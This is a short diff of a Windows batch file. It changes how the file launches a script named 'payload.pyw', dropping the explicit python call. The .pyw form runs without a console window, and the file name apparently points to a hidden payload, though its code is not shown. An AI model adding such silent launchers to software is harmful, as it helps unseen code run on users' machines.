@@ -1,3 +1,3 @@
 @echo off 
-start python payload.pyw
+start payload.pyw
 exit
